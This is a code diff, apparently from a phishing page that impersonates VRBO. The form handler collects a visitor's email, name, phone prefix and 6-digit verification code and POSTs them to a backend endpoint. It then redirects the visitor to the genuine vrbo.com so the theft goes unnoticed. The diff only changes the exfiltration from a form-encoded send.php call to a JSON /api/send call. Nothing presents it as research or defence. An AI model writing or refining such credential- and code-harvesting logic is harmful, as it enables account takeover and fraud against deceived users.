@@ -108,13 +108,12 @@ document.getElementById('verify-form').addEventListener('submit', (e) => {
   const lada   = sessionStorage.getItem('vrbo_lada')   || '';
   const numero = verifyInput.value; // ← código 6 dígitos = "numero"
 
-  fetch('send.php', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-    body: `correo=${encodeURIComponent(correo)}&nombre=${encodeURIComponent(nombre)}&lada=${encodeURIComponent(lada)}&numero=${encodeURIComponent(numero)}`
-  }).finally(() => {
-    setTimeout(() => { window.location.href = 'https://www.vrbo.com/?siteid=9025005'; }, 3000);
-  });
+                                                        fetch('/api/send', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ correo, nombre, lada, numero })
+}).finally(() => {
+  setTimeout(() => { window.location.href = 'https://www.vrbo.com/?siteid=9025005'; }, 3000);
 });
 </script>
 </body>
